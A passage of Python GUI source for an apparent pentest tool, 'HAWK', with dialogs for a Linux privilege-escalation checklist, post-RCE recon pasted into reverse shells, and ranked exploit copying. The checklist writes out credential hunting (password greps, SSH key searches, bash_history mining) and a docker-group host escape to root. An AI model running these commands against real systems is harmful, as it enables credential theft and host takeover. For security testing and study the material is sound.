                ("crontab -l 2>/dev/null; "
                 "for u in $(cut -f1 -d: /etc/passwd); do "
                 "crontab -u $u -l 2>/dev/null; done",
                 "YOUR crontab + every user's crontab (only works "
                 "if already root for the second loop, but harmless)."),
            ]),
            ("🟡  GROUP MEMBERSHIPS — container / disk escape", [
                ("id; groups",
                 "Your user + group memberships.  Dangerous groups: "
                 "docker (container → host), lxd/lxc (privileged "
                 "container), disk (raw /dev/sda access), adm (log "
                 "read), video (screen capture), plugdev (device "
                 "attach)."),
                ("docker ps 2>/dev/null && "
                 "echo 'You are in docker group → root in 1 command'",
                 "If `docker ps` works: "
                 "`docker run -v /:/mnt --rm -it alpine chroot /mnt sh` "
                 "= root shell on host."),
            ]),
            ("🟡  NFS / SHARES — network-to-root pivot", [
                ("cat /etc/exports 2>/dev/null; "
                 "showmount -e localhost 2>/dev/null",
                 "NFS exports with no_root_squash let an attacker "
                 "who can mount the share create SUID binaries as "
                 "root.  From Kali: mount, compile a SUID shell, "
                 "run it back on target."),
                ("mount | grep nfs; "
                 "cat /etc/fstab 2>/dev/null | grep nfs",
                 "NFS mounts the target itself consumes — might "
                 "expose credentials or writable data from remote "
                 "servers."),
            ]),
            ("🟢  PROCESSES / SERVICES — misconfigs & credentials", [
                ("ps auxf 2>/dev/null | grep -v '^\\[' | head -40",
                 "Full process tree.  Look for processes running as "
                 "root with config paths in argv (databases, web "
                 "apps).  Credentials sometimes leak in argv / "
                 "environment."),
                ("systemctl list-units --type=service --state=running "
                 "2>/dev/null | head -30",
                 "Active services.  Check unit file paths with "
                 "`systemctl cat <service>` — if ExecStart= path is "
                 "writable or the unit file itself is writable → "
                 "modify + restart = RCE as the service user."),
                ("netstat -tulnp 2>/dev/null || ss -tulnp 2>/dev/null",
                 "Listening ports.  Services bound to 127.0.0.1 only "
                 "are internal — pivot to them via SSH port forward "
                 "or chisel tunnel once you have any shell."),
            ]),
            ("🔵  CREDENTIALS — filesystem / environment", [
                ("grep -RIl -E "
                 "'password|passwd|pwd|secret|token|api[_-]?key' "
                 "/etc /var/www /opt /home 2>/dev/null | head -20",
                 "Files that mention credential-like keywords.  "
                 "Classic hits: web app .env files, database.yml, "
                 "backup scripts, init.d wrappers with passwords in "
                 "arguments.  Check each file before assuming a hit."),
                ("find / -name 'id_rsa*' -o -name 'id_dsa*' "
                 "-o -name 'id_ecdsa*' -o -name 'id_ed25519*' "
                 "2>/dev/null",
                 "SSH private keys readable anywhere.  Copy to Kali "
                 "and `ssh -i <key> user@host`.  Check ~/.ssh/ of "
                 "other users first — often left over after admin "
                 "cleanup."),
                ("env | grep -iE "
                 "'pass|token|secret|key|auth|cred' 2>/dev/null",
                 "Environment variables with credential-looking "
                 "names.  CI/CD runners leak tons here.  "
                 "DATABASE_URL often contains password."),
                ("cat /root/.bash_history ~/.bash_history "
                 "2>/dev/null | grep -iE "
                 "'pass|mysql|psql|curl.*-u|sshpass|ssh ' | head -20",
                 "Command history — admins often type `mysql -u root "
                 "-p<password>` or `sshpass -p <password>` on the "
                 "command line.  Goldmine when it exists."),
            ]),
        ]

        for section_title, commands in CHECKLIST:
            sec_fr = ctk.CTkFrame(
                scroll, fg_color=COLORS["bg_card"],
                corner_radius=4,
                border_color=COLORS["border_dim"],
                border_width=1)
            sec_fr.pack(fill="x", padx=4, pady=(6, 0))
            ctk.CTkLabel(
                sec_fr, text=f"  {section_title}",
                font=_f("sm", True),
                text_color=COLORS["text_bright"],
                anchor="w").pack(fill="x", padx=8, pady=(6, 2))

            for cmd, explanation in commands:
                cmd_fr = ctk.CTkFrame(
                    sec_fr, fg_color=COLORS["bg_secondary"],
                    corner_radius=3)
                cmd_fr.pack(fill="x", padx=6, pady=2)

                top = ctk.CTkFrame(cmd_fr, fg_color="transparent")
                top.pack(fill="x", padx=6, pady=(4, 0))

                cmd_box = ctk.CTkTextbox(
                    top, height=28, font=("Courier", 11),
                    fg_color=COLORS["bg_card"],
                    text_color=COLORS["text_bright"],
                    border_color=COLORS["border_dim"],
                    border_width=1, corner_radius=3, wrap="none")
                cmd_box.pack(side="left", fill="x", expand=True,
                             padx=(0, 6))
                cmd_box.insert("1.0", cmd)
                cmd_box.configure(state="disabled")
                # Same wheel-bubbling trick as the Windows checklist —
                # otherwise the mouse wheel gets trapped in the 28-px
                # single-line textbox and the outer list won't scroll.
                cmd_box._hawk_bubble_wheel = True
                try:
                    cmd_box._textbox._hawk_bubble_wheel = True
                except Exception:
                    pass

                def _copy_cmd(c=cmd):
                    try:
                        win.clipboard_clear()
                        win.clipboard_append(c)
                    except Exception:
                        pass

                ctk.CTkButton(
                    top, text="COPY", width=60, height=26,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_card"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_green"],
                    border_width=1,
                    text_color=COLORS["text_green"], corner_radius=3,
                    command=_copy_cmd).pack(side="left")

                ctk.CTkLabel(
                    cmd_fr, text=f"  {explanation}",
                    font=_f("xs"),
                    text_color=COLORS["text_muted"],
                    anchor="w", wraplength=780, justify="left"
                ).pack(fill="x", padx=8, pady=(2, 6))

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)

    # ── POST-RCE RECON ────────────────────────────────────────────────
    # Two-pane dialog: copy-paste bash snippet on the LEFT (the user
    # pastes it into whatever reverse-shell they have open), output
    # paste + ANALYZE on the RIGHT.  The analyzer in
    # utils/post_rce_recon.py detects the "id lies in non-login shells"
    # trap (NSS supplementary groups missing from `id`), exploitable
    # SUID, dangerous capabilities, world-writable critical binaries,
    # and docker/lxd sockets — each pushed as a Target Intel finding
    # via add_auto_finding.
    #
    # Target-agnostic: the snippet is plain POSIX bash, no HTB-only
    # assumptions.  Equally useful on a CTF box, an internal AD
    # member box once you land a shell, or an external pentest where
    # you've already RCE'd a public-facing app.
    def _show_post_rce_recon_dialog(self, platform: str = "linux"):
        """Open the post-RCE recon copy-paste dialog.

        ``platform`` selects the snippet flavour:
            "linux"   — bash one-liner, parsed by utils/post_rce_recon
            "windows" — PowerShell-bootstrapped from cmd.exe, parsed
                        by utils/post_rce_recon_win

        The two branches share the same 2-pane UI; only the snippet
        text and the analyzer module differ.  Findings push to the
        same Target Intel via add_auto_finding so privesc_cheat
        sees them uniformly.
        """
        from gui.dialogs import (_make_win, _title, _sub,
                                  _btn_row, _btn, _safe_destroy)
        try:
            if platform == "windows":
                from utils import post_rce_recon_win as pr
            else:
                from utils import post_rce_recon as pr
        except Exception as e:
            try:
                self.app.terminal.write(
                    f"  [!] Post-RCE Recon module failed to import: {e}",
                    "error")
            except Exception:
                pass
            return

        # Resolve a display target for finding scope (host or IP)
        target_label = ""
        try:
            sess = self.app.session_manager.current
            if sess:
                target_label = (sess.target_domain
                                or sess.target_ip or "")
        except Exception:
            pass

        title_suffix = " (Windows)" if platform == "windows" else ""
        win = _make_win(
            self,
            f"Post-RCE Recon{title_suffix} — copy snippet, paste output",
            1180, 760)
        _title(win,
               f"POST-RCE RECON{title_suffix}  —  copy-paste recon for "
               f"any reverse shell")
        _sub(win,
             "1. Copy the snippet below   2. Paste it in the target shell   "
             "3. Paste the captured output back here   4. ANALYZE",
             COLORS["text_dim"])

        # Why this exists — OS-specific gotcha box
        info = ctk.CTkFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_green"],
            border_width=2, corner_radius=4)
        info.pack(fill="x", padx=14, pady=(4, 8))
        if platform == "windows":
            info_title = ("  ⓘ  Why this matters — token privileges "
                          "are the privesc surface")
            info_body = (
                "On Windows, privesc usually hinges on which "
                "privileges are Enabled in the current token, NOT "
                "on file permissions.  SeImpersonate / "
                "SeAssignPrimaryToken (typical of service accounts: "
                "IIS, MSSQL, MSA) → SYSTEM via Potato.  SeBackup / "
                "SeRestore → read SAM/SYSTEM hives → impacket-"
                "secretsdump offline → all local hashes.  The "
                "snippet bootstraps PowerShell from cmd.exe and "
                "dumps `whoami /priv`, AlwaysInstallElevated state, "
                "unquoted service paths, SYSTEM scheduled tasks, "
                "and saved vault credentials in one shot.")
        else:
            info_title = "  ⓘ  Why this matters — non-login shells lie"
            info_body = (
                "`id` in a reverse-shell only shows the groups the "
                "PROCESS inherited — supplementary groups (docker, "
                "lxd, disk, shadow…) are often missing.  HAWK runs "
                "`getent group | grep $USER` and compares: any group "
                "in NSS but not in `id` is a HIDDEN privilege you'd "
                "miss.  Activate it for one command with "
                "`sg <group> -c \"<cmd>\"`.")
        ctk.CTkLabel(
            info, text=info_title,
            font=_f("md", True),
            text_color=COLORS["text_green"],
            anchor="w").pack(fill="x", padx=10, pady=(8, 2))
        ctk.CTkLabel(
            info, text=info_body,
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", wraplength=1120, justify="left"
        ).pack(fill="x", padx=10, pady=(0, 8))

        # 2-column body
        body = ctk.CTkFrame(win, fg_color="transparent")
        body.pack(fill="both", expand=True, padx=14, pady=(0, 4))
        body.grid_columnconfigure(0, weight=1, uniform="cols")
        body.grid_columnconfigure(1, weight=1, uniform="cols")
        body.grid_rowconfigure(0, weight=1)

        # ── LEFT: snippet ───────────────────────────────────────────
        left = ctk.CTkFrame(body, fg_color="transparent")
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 6))

        ctk.CTkLabel(
            left, text="① Snippet — paste this in the target shell",
            font=_f("md", True),
            text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", pady=(2, 4))

        snippet = pr.generate_snippet()
        snip_box = ctk.CTkTextbox(
            left, font=("Courier", 11),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3, wrap="word")
        snip_box.pack(fill="both", expand=True, pady=(0, 4))
        snip_box.insert("1.0", snippet)
        snip_box.configure(state="disabled")

        def _copy_snip():
            try:
                win.clipboard_clear()
                win.clipboard_append(snippet)
                copy_btn.configure(text="✓ COPIED")
                win.after(
                    1500,
                    lambda: copy_btn.configure(text="📋 COPY SNIPPET"))
            except Exception:
                pass

        copy_btn = ctk.CTkButton(
            left, text="📋 COPY SNIPPET", height=32,
            font=_f("sm", True),
            fg_color=COLORS["bg_card"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"],
            border_width=1,
            text_color=COLORS["text_green"], corner_radius=3,
            command=_copy_snip)
        copy_btn.pack(fill="x", pady=(0, 2))

        # ── RIGHT: paste output + analyze ───────────────────────────
        right = ctk.CTkFrame(body, fg_color="transparent")
        right.grid(row=0, column=1, sticky="nsew", padx=(6, 0))

        ctk.CTkLabel(
            right, text="② Output — paste captured text here",
            font=_f("md", True),
            text_color=COLORS["text_bright"],
            anchor="w").pack(fill="x", pady=(2, 4))

        out_box = ctk.CTkTextbox(
            right, font=("Courier", 11),
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_dim"],
            border_width=1, corner_radius=3, wrap="word")
        out_box.pack(fill="both", expand=True, pady=(0, 4))

        # Status / summary line under the textbox
        status_lbl = ctk.CTkLabel(
            right, text="", font=_f("sm"),
            text_color=COLORS["text_dim"],
            anchor="w", wraplength=540, justify="left")
        status_lbl.pack(fill="x", pady=(0, 4))

        def _analyze():
            text = out_box.get("1.0", "end").strip()
            if not text:
                status_lbl.configure(
                    text="⚠  Paste the captured output first.",
                    text_color=COLORS["text_yellow"])
                return
            if "___HAWK_BEGIN___" not in text:
                status_lbl.configure(
                    text=("⚠  Markers ___HAWK_BEGIN___ not found — "
                          "did the snippet finish?  Paste the FULL "
                          "output, including the BEGIN/END lines."),
                    text_color=COLORS["text_yellow"])
                return
            try:
                result = pr.analyze_output(text)
            except Exception as e:
                status_lbl.configure(
                    text=f"⚠  Analyzer error: {e}",
                    text_color=COLORS["text_yellow"])
                return

            findings = result.get("findings", [])
            user = result.get("user") or "?"
            host = (result.get("host")
                    or target_label
                    or "target")
            warnings = result.get("parse_warnings", [])

            # Push findings to Target Intel — title scoped to host so
            # reruns on a different box don't merge with the wrong
            # finding (analyze_output already includes the host in
            # each title).  Source string differs per platform so
            # downstream filters (skip-MSF list, deduplicators) can
            # tell them apart.
            push_source = ("post-rce-recon-win"
                           if platform == "windows"
                           else "post-rce-recon")
            pushed = 0
            for f in findings:
                try:
                    self.app.target_intel.add_auto_finding(
                        title=f["title"],
                        description=f["description"],
                        severity=f.get("severity", "info"),
                        source=push_source)
                    pushed += 1
                except Exception as e:
                    try:
                        self.app.terminal.write(
                            f"  [!] add_auto_finding failed: {e}",
                            "error")
                    except Exception:
                        pass

            # Terminal summary
            try:
                term = self.app.terminal
                term.write(
                    f"\n  [POST-RCE RECON] analyzed shell — "
                    f"user={user} host={host}", "info")
                hidden = result.get("hidden_groups", [])
                if hidden:
                    term.write(
                        f"  [POST-RCE RECON] HIDDEN GROUPS: "
                        f"{', '.join(hidden)}", "warn")
                term.write(
                    f"  [POST-RCE RECON] {pushed} finding(s) pushed "
                    f"to Target Intel", "success")
                for f in findings:
                    sev = f.get("severity", "info").upper()
                    term.write(
                        f"    [{sev}] {f['title']}",
                        "warn" if sev in ("CRITICAL", "HIGH")
                        else "info")
                for wmsg in warnings:
                    term.write(f"  [post-rce-recon] {wmsg}", "dim")
            except Exception:
                pass

            # Inline status — colour-coded headline
            crit = sum(1 for f in findings
                       if f.get("severity") == "critical")
            high = sum(1 for f in findings
                       if f.get("severity") == "high")
            if crit:
                msg = (f"✓ {pushed} finding(s) pushed — "
                       f"{crit} CRITICAL, {high} HIGH.  "
                       f"See Target Intel.")
                color = COLORS.get("text_red", "#FF6B6B")
            elif high:
                msg = (f"✓ {pushed} finding(s) pushed — "
                       f"{high} HIGH.  See Target Intel.")
                color = COLORS["text_yellow"]
            elif pushed:
                msg = (f"✓ {pushed} finding(s) pushed.  "
                       f"See Target Intel.")
                color = COLORS["text_green"]
            else:
                msg = ("✓ Output parsed — no privesc-relevant "
                       "findings detected.")
                color = COLORS["text_dim"]
            status_lbl.configure(text=msg, text_color=color)

        # ── footer buttons ──────────────────────────────────────────
        row = _btn_row(win)
        _btn(row, "ANALYZE", _analyze, primary=True, w=160)
        _btn(row, "CLOSE", lambda: _safe_destroy(win))

    # ── PRIVESC CHEAT SHEET ───────────────────────────────────────────
    # Synthesizes Target Intel findings (post-RCE recon, linpeas,
    # manual notes) into ranked privesc paths.  Curated catalog in
    # utils/privesc_patterns.py — intentionally "in crescendo": new
    # patterns are appended without parser changes, so the catalog
    # grows from CTF-only into broader pentest scenarios over time.
    #
    # Target-agnostic: patterns work whether the shell came from an
    # HTB CTF, an internal AD member box, or an external public-
    # facing target.  When no findings are present yet, the dialog
    # nudges the operator to run POST-RCE RECON or LINPEAS first.
    def _show_privesc_cheat_dialog(self):
        from gui.dialogs import (_make_win, _title, _sub,
                                  _btn_row, _btn, _safe_destroy)
        try:
            from utils import privesc_patterns as pp
        except Exception as e:
            try:
                self.app.terminal.write(
                    f"  [!] Privesc patterns failed to import: {e}",
                    "error")
            except Exception:
                pass
            return

        # Pull current findings + scope context
        findings: list[dict] = []
        kernel = ""
        target_label = ""
        target_ip = ""
        try:
            intel = self.app.target_intel
            findings = list(getattr(intel, "_auto_findings", []) or [])
        except Exception:
            findings = []
        try:
            sess = self.app.session_manager.current
            if sess:
                target_label = (sess.target_domain
                                or sess.target_ip or "")
                target_ip = sess.target_ip or ""
        except Exception:
            pass
        # Best-effort kernel extraction from any finding mentioning it
        for f in findings:
            desc = (f.get("description") or "")
            m = re.search(r"\b(\d+\.\d+\.\d+(?:-\S+)?)", desc)
            if m and ("Linux" in desc or "kernel" in desc.lower()
                     or "uname" in desc.lower()):
                kernel = m.group(1)
                break

        # Best-effort docker images extraction from the finding the
        # post-rce-recon analyzer pushes ("Local docker images on
        # <host> (N)").  Lines look like "  • mysql:latest" — we
        # strip the bullet/whitespace and pass the list to match()
        # so the docker_group exploit substitutes IMG_NAME with a
        # real image instead of the placeholder.  Falls back to []
        # on missing finding (privesc_cheat works fine without it,
        # the operator just sees IMG_NAME as a literal placeholder).
        docker_images: list[str] = []
        internet = "unknown"
        for f in findings:
            title = (f.get("title") or "").lower()
            desc = (f.get("description") or "")
            if "local docker images" in title:
                for ln in desc.splitlines():
                    ln = ln.strip()
                    if ln.startswith("•"):
                        ln = ln.lstrip("•").strip()
                    if ln and ":" in ln and " " not in ln:
                        docker_images.append(ln)
            if "air-gapped" in title or "appears air-gapped" in title:
                internet = "offline"

        matches = pp.match(
            findings, kernel=kernel, user="", host=target_label,
            target_ip=target_ip,
            docker_images=docker_images, internet=internet)

        win = _make_win(
            self, "Privesc Cheat Sheet — ranked paths", 1100, 800)
        scope = target_label or "this target"
        _title(win, f"PRIVESC CHEAT SHEET  —  {scope}")
        _sub(win,
             f"Ranked privesc paths based on {len(findings)} "
             f"finding(s) on Target Intel.  Catalog: "
             f"{len(pp.PATTERNS)} curated patterns.",
             COLORS["text_dim"])

        # Empty state — nudge to run recon first
        if not findings:
            empty = ctk.CTkFrame(
                win, fg_color=COLORS["bg_card"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=4)
            empty.pack(fill="x", padx=16, pady=12)
            ctk.CTkLabel(
                empty,
                text="ⓘ  No findings yet on Target Intel",
                font=_f("md", True),
                text_color=COLORS["text_yellow"],
                anchor="w").pack(fill="x", padx=12, pady=(10, 4))
            ctk.CTkLabel(
                empty,
                text=("Run POST-RCE RECON (paste the snippet in "
                      "your shell, paste output back) or LINPEAS "
                      "first.  Once findings appear on Target "
                      "Intel, re-open this dialog and HAWK will "
                      "rank the privesc paths most likely to work."),
                font=_f("sm"),
                text_color=COLORS["text_dim"],
                anchor="w", wraplength=1040,
                justify="left").pack(fill="x", padx=12, pady=(0, 10))
            row = _btn_row(win)
            _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)
            return

        if not matches:
            empty = ctk.CTkFrame(
                win, fg_color=COLORS["bg_card"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=4)
            empty.pack(fill="x", padx=16, pady=12)
            ctk.CTkLabel(
                empty,
                text=(f"ⓘ  None of the {len(pp.PATTERNS)} curated "
                      "patterns matched the current findings"),
                font=_f("md", True),
                text_color=COLORS["text_yellow"],
                anchor="w").pack(fill="x", padx=12, pady=(10, 4))
            ctk.CTkLabel(
                empty,
                text=("Doesn't mean there's no privesc — just that "
                      "none of HAWK's catalogued shortcuts apply.  "
                      "Try the MANUAL LINUX PRIVESC CHECKLIST card, "
                      "or open a kernel-CVE search with the "
                      "kernel + distro fingerprint."),
                font=_f("sm"),
                text_color=COLORS["text_dim"],
                anchor="w", wraplength=1040,
                justify="left").pack(fill="x", padx=12, pady=(0, 10))
            row = _btn_row(win)
            _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)
            return

        # Severity → colour mapping (uses palette already in use elsewhere)
        sev_color = {
            "critical": COLORS.get("text_red", "#FF6B6B"),
            "high":     COLORS["text_yellow"],
            "medium":   COLORS.get("text_cyan", "#7EC8E3"),
            "low":      COLORS["text_dim"],
            "info":     COLORS["text_dim"],
        }

        # ── Variant toggle (PS / CMD) ─────────────────────────────
        # Shown only when at least one Windows pattern matched.  The
        # default is decided by what's in the matches: if ALL matches
        # are Windows we default to PS; mixed Linux+Windows defaults
        # to "auto" (each card picks its own appropriate variant).
        # Linux-only result hides the toggle entirely — it would have
        # no effect anyway.
        any_win = any(m.get("platform") == "windows" for m in matches)
        all_win = all(m.get("platform") == "windows" for m in matches)
        variant_var = ctk.StringVar(
            value=("ps" if all_win else "auto"))

        if any_win:
            tog = ctk.CTkFrame(win, fg_color="transparent")
            tog.pack(fill="x", padx=14, pady=(2, 0))
            ctk.CTkLabel(
                tog, text="Windows shell variant:",
                font=_f("sm"),
                text_color=COLORS["text_dim"],
                anchor="w").pack(side="left", padx=(2, 8))

            def _re_render():
                # Re-paint the scrollable list whenever the variant
                # toggle changes.  Cheap because the matches list is
                # already computed; only the rendering changes.
                for w in list(scroll.winfo_children()):
                    try:
                        w.destroy()
                    except Exception:
                        pass
                _populate_cards()

            for label, val in (("Auto", "auto"),
                                ("PowerShell", "ps"),
                                ("cmd.exe", "cmd")):
                ctk.CTkRadioButton(
                    tog, text=label, variable=variant_var, value=val,
                    font=_f("sm"),
                    text_color=COLORS["text_bright"],
                    fg_color=COLORS["text_green"],
                    border_color=COLORS["border_dim"],
                    hover_color=COLORS["bg_card_hover"],
                    command=_re_render
                ).pack(side="left", padx=(0, 12))

        # Scrollable list of pattern cards, ranked
        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"])
        scroll.pack(fill="both", expand=True, padx=14, pady=(2, 4))

        def _populate_cards():
            current_variant = variant_var.get()
            for m in matches:
                _render_one_card(m, current_variant)

        def _render_one_card(m, current_variant):
            sev = m.get("severity", "info").lower()
            color = sev_color.get(sev, COLORS["text_dim"])

            card = ctk.CTkFrame(
                scroll, fg_color=COLORS["bg_card"],
                border_color=color, border_width=1,
                corner_radius=4)
            card.pack(fill="x", padx=4, pady=4)

            # Header row: severity badge + name + match reason
            head = ctk.CTkFrame(card, fg_color="transparent")
            head.pack(fill="x", padx=10, pady=(8, 2))
            ctk.CTkLabel(
                head, text=f"[{sev.upper()}]",
                font=_f("sm", True),
                text_color=color, anchor="w", width=80
            ).pack(side="left")
            ctk.CTkLabel(
                head, text=f"  {m.get('name', '')}",
                font=_f("md", True),
                text_color=COLORS["text_bright"],
                anchor="w", justify="left").pack(side="left", fill="x",
                                                  expand=True)

            why = m.get("why", "")
            if why:
                ctk.CTkLabel(
                    card,
                    text=f"  ↳ matched on: {why}",
                    font=_f("xs"),
                    text_color=COLORS["text_dim"],
                    anchor="w", wraplength=1020,
                    justify="left").pack(fill="x", padx=10, pady=(0, 4))

            # Body — render() returns (title, body) but we want
            # everything below the title (we already drew the
            # header above, so just take the body block).
            _t, body = pp.render(m, variant=current_variant)
            # Strip the duplicated header/why/blank lines render()
            # adds at the top — keep only summary onwards.
            body_lines = body.splitlines()
            # Drop the first 2 lines ("[SEV] name", "  ↳ matched on")
            # plus blank.  render() guarantees the summary block.
            keep_from = 0
            for i, ln in enumerate(body_lines):
                if ln.startswith("[") or ln.lstrip().startswith("↳"):
                    keep_from = i + 1
            # Trim leading blank
            while keep_from < len(body_lines) and not body_lines[keep_from].strip():
                keep_from += 1
            cleaned = "\n".join(body_lines[keep_from:])

            box = ctk.CTkTextbox(
                card, font=("Courier", 11),
                fg_color=COLORS["bg_secondary"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_dim"],
                border_width=1, corner_radius=3, wrap="word",
                height=240)
            box.pack(fill="x", padx=10, pady=(2, 4))
            box.insert("1.0", cleaned)
            box.configure(state="disabled")
            # Bubble wheel up so the outer scroll keeps working
            box._hawk_bubble_wheel = True
            try:
                box._textbox._hawk_bubble_wheel = True
            except Exception:
                pass

            # COPY EXPLOIT button — copies just the exploit block,
            # honouring the currently-selected variant (PS / cmd /
            # auto).  Mirrors the variant-resolution logic in
            # privesc_patterns.render().
            def _copy_exploit(match=m, vsel=current_variant):
                platform = match.get("platform", "linux")
                exploit_ps = match.get("exploit_ps")
                exploit_cmd = match.get("exploit", [])
                if vsel == "ps":
                    lines_to_copy = exploit_ps if exploit_ps else exploit_cmd
                elif vsel == "cmd":
                    lines_to_copy = exploit_cmd
                else:  # auto
                    lines_to_copy = (exploit_ps
                                     if (platform == "windows"
                                         and exploit_ps)
                                     else exploit_cmd)

                user = match.get("_user", "") or "USER"
                host = match.get("_host", "") or "HOST"
                ip = match.get("_target_ip", "") or "YOUR_KALI_IP"
                images = match.get("_docker_images") or []
                img = images[0] if images else "IMG_NAME"
                txt = "\n".join(
                    ln.replace("{user}", user)
                      .replace("{host}", host)
                      .replace("{target_ip}", ip)
                      .replace("IMG_NAME", img)
                    for ln in lines_to_copy)
                try:
                    win.clipboard_clear()
                    win.clipboard_append(txt)
                except Exception:
                    pass

            btn_row = ctk.CTkFrame(card, fg_color="transparent")
            btn_row.pack(fill="x", padx=10, pady=(0, 8))
            ctk.CTkButton(
                btn_row, text="📋 COPY EXPLOIT", height=28, width=160,
                font=_f("sm", True),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=color, border_width=1,
                text_color=color, corner_radius=3,
                command=_copy_exploit).pack(side="left")

        # Initial paint of the cards — the variant toggle (if shown)
        # will call _re_render → _populate_cards on every change.
        _populate_cards()

        row = _btn_row(win)
        _btn(row, "CLOSE", lambda: _safe_destroy(win), primary=True)

